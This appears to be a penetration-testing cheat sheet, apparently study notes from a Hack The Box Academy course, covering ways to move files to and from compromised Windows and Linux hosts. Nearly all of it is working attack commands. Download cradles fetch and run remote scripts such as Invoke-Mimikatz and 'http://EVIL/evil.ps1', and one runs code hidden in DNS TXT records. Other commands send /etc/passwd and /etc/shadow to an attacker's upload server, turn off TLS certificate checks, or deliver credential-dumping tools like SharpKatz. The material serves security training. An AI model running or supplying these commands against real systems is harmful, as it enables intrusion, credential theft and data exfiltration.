# File transfer

[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

# 1. Windows

[https://gist.github.com/HarmJ0y/bb48307ffa663256e239](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

```bash
# base64
# Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
IIIhtbacademy@htb[/htb]$ md5sum id_rsa
IIIhtbacademy@htb[/htb]$ cat id_rsa |base64 -w 0;echo
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUd<snip>"))
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

# certutil.exe
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

#  System.Net.WebClient class
=> Method Description
* OpenRead	Returns the data from a resource as a Stream.
* OpenReadAsync	Returns the data from a resource without blocking the calling thread.
* DownloadData	Downloads data from a resource and returns a Byte array.
* DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.
* DownloadFile	Downloads data from a resource to a local file.
* DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.
* DownloadString	Downloads a String from a resource and returns a String.
* DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

# PowerShell DownloadString - Fileless Method, download the payload and execute it directly
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
# also support pipe
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

# From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

# hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# WinHttp COM object (not proxy aware!)
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

# using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
#   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex

# There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. bypass with -UseBasicParsing
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
# Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Using SMB server
IIIhtbacademy@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
C:\htb> copy \\192.168.220.133\share\nc.exe

# New versions of Windows block unauthenticated guest access
IIIhtbacademy@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
C:\htb> net use n: \\192.168.220.133\share /user:test test

# FTP
IIIhtbacademy@htb[/htb]$ sudo pip3 install pyftpdlib
IIIhtbacademy@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# with non-interactive mode
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous
ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file

# Upload Operations from victim to our attack machine
# base64
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
IIIhtbacademy@htb[/htb]$ echo IyB<snip> | base64 -d > hosts

# upload server
IIIhtbacademy@htb[/htb]$ pip3 install uploadserver
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# using nc
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
IIIhtbacademy@htb[/htb]$ nc -lvnp 8000
IIIhtbacademy@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts

# WebDav
# WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
IIIhtbacademy@htb[/htb]$ sudo pip3 install wsgidav cheroot
IIIhtbacademy@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder
C:\htb> dir \\192.168.49.128\DavWWWRoot
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

# FTP uploads
IIIhtbacademy@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

# 2. Linux

```bash
# base64
IIIhtbacademy@htb[/htb]$ cat id_rsa |base64 -w 0;echo
IIIhtbacademy@htb[/htb]$ echo -n 'LS0tLS1CRUdJ<snip>' | base64 -d > id_rsa

# wget and curl
IIIhtbacademy@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
IIIhtbacademy@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# download and execute directly
IIIhtbacademy@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
IIIhtbacademy@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

# download with bash
IIIhtbacademy@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
IIIhtbacademy@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
IIIhtbacademy@htb[/htb]$ cat <&3

# ssh
# Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
IIIhtbacademy@htb[/htb]$ sudo systemctl enable ssh
IIIhtbacademy@htb[/htb]$ sudo systemctl start ssh
IIIhtbacademy@htb[/htb]$ netstat -lnpt
IIIhtbacademy@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 

# upload
IIIhtbacademy@htb[/htb]$ sudo python3 -m pip install --user uploadserver

# Pwnbox - Create a Self-Signed Certificate
IIIhtbacademy@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
IIIhtbacademy@htb[/htb]$ mkdir https && cd https
IIIhtbacademy@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

IIIhtbacademy@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# multiple upload server to choose
# Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.
IIIhtbacademy@htb[/htb]$ python3 -m http.server
IIIhtbacademy@htb[/htb]$ python2.7 -m SimpleHTTPServer
IIIhtbacademy@htb[/htb]$ php -S 0.0.0.0:8000
IIIhtbacademy@htb[/htb]$ ruby -run -ehttpd . -p8000
IIIhtbacademy@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```

# 3. Codes

```bash
# Python
IIIhtbacademy@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
IIIhtbacademy@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# PHP
IIIhtbacademy@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
IIIhtbacademy@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
IIIhtbacademy@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

# Ruby
IIIhtbacademy@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Perl
IIIhtbacademy@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

# javascript
-------------- wget.js -----------------
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
----------------------------------------

C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

# VBScript
----------- wget.vbs -----------------
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
-------------------------------------

C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

# upload with python3
IIIhtbacademy@htb[/htb]$ python3 -m uploadserver 
IIIhtbacademy@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

# 4. Misc methods

```bash
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
IIIhtbacademy@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
IIIhtbacademy@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
IIIhtbacademy@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

```